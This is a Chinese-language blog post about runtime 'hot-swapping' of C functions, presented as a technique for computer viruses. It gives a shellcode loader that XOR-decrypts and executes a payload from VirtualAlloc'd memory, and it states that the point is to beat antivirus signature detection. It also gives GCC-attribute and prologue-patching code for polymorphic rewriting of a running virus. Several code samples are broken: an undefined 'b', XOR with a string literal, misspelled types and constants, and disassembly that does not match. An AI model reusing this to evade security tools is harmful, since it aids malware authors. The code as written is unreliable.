---
title: C 语言的热插拔
date: 2016-03-02
---

如今，电脑病毒这个词语已经没有当年那样的火热流行了。之前的 XGhost 事件，还有诸如 Veil Framework, Shellter 这样的框架的冒出。
其实不然，相对的是人们已经不是像以前的人们为了证明自己的能力而开发电脑病毒，反而趋向成熟发展成了各种木马，还有广告程序 (Javascript, Nodejs 端的花样也很多呢)。变成研究电脑病毒变成了一个浪漫的项目呢…

<!-- more -->

## 加密

我们来简单的加密我们的 shellcode, （啥？你不懂 shellcode ?）
这样至少我们能成功逃避我们防毒软件的特征码检测。

```cpp
#include <windows.h>
#include <iostream>

int main(int argc, char **argv) {
    char shellcode[] = { };
    char magic[sizeof b];
    for (int i = 0; i < sizeof b; i++)
        magic[i] = shellcode[i] ^ "secret_key";
    void *exec = VirtualAlloc(0, sizeof magic, MEM_COMMIT, PAGE_EXECUTION_READWRITE);
    memcpy(exec, magic, sizeof magic);
    ((void (*)()) exec)();
}
```

无法置信地短的代码，但是无疑地防毒软件的特征码检测对这个没办法。因为我们几乎是加密了一番。

但是如果我们要大量传播的话，只要收集够量的样本我们的加密就没有它的效用了…，所以我们引用的是很久以前黑客的那一套，"Polymorhic"

## Polymorhic 技巧

目前为止大部分的文章只有在内容 shellcode 上做 Polymorhic 混淆。但是如果牵涉到 stager 级别的话就很难做到了。这个要很熟悉编译器的 linking 技巧。

那么假设用上面的做例子做了一点修改

```cpp
void virus() {
    char shellcode[] = { };
    char magic[sizeof b];
    for (int i = 0; i < sizeof b; i++)
        magic[i] = shellcode[i] ^ "secret_key";
    void *exec = VirtualAlloc(0, sizeof magic, MEM_COMMIT, PAGE_EXECUTION_READWRITE);
    memcpy(exec, magic, sizeof magic);
    ((void (*)()) exec)();
}

int main() {
    virus();
}
```

我们现在要做的是类似热补丁的效果，在病毒运行期间改变其函数特征。
我先说说原理吧：
首先我们在函数的头部改写成无条件跳转到新的函数。这样我们最小的颗粒度会是函数 :) 在这之前我们要了解的是线程之间没有任何同步的关系。

我们在这里用的是 GCC 的技巧。 *ms_hook_prologue* 的属性，这会在函数的头部放一段 8 bytes 的 NOP 段。

<div class="tip">
  NOP 需要对齐哦，因为我们是直接写入的。不然会发生些奇怪的事 (当然是不好的事了)
</div>

所以我们需要 *aligned* 属性来确保对齐啊

* 我们需要确保的是我们的函数之间会是 PIC (Position Independent Code) 即不是 inline 也不是 cloned 的。

所以我们需要 *noclone* 属性来确保编译器不会优化我们的函数成 inline function。

* GCC 会默认地存储我们的函数 return address 在头部，所以如果我们要热插拔的功能的话我们要做点手脚，在这里我们用了 *__asm("")* 这个关键字

所以我们的代码会是：

```
__attribute__ ((ms_hook_prologue))
__attribute__ ((aligned(8))
__attribute__ ((noinline))
__attribute__ ((noclone))

void virus() {
    char shellcode[] = { };
    char magic[sizeof b];
    for (int i = 0; i < sizeof b; i++)
        magic[i] = shellcode[i] ^ "secret_key";
    void *exec = VirtualAlloc(0, sizeof magic, MEM_COMMIT, PAGE_EXECUTION_READWRITE);
    memcpy(exec, magic, sizeof magic);
    ((void (*)()) exec)();
}

int main() {
    virus();
}
```

看看汇编看起来会怎样

```
$ objdump -Mintel -d main
0000000000400448 <main>:
  400448:       48 8d a4 24 00 00 00     lea    rsp,[rsp+0x0]
  40044f:       00
  400450:       bf d4 09 40 00           mov    edi,0x401894
```

很好！我们有了对齐的 8 bytes 头 NOP 了

## 热插拔函数

简单地将取代函数地址，8 bytes 对齐了之后
```
void worker(void *target, void *replacement) {
    assert(((unintptr_t) target & 0x07) == 0);
    void *page = (void *)((unintptr_t) target & ~0xfff);
    mprotect(page, 4096, PROT_WRITE | PROT_EXEC);
    uint32_t rel = (char *)replacement - (char *) target -5;
    union {
        unit8_t bytes[8];
        unit64_t value;
    } instruction = { {0xe9, rel >> 0, rel >> 8, rel >> 16, rel >> 24 } };
    *(uint64_t *)target = instruction.value;
    mprotect(page, 4096, PROT_EXEC);
}
```
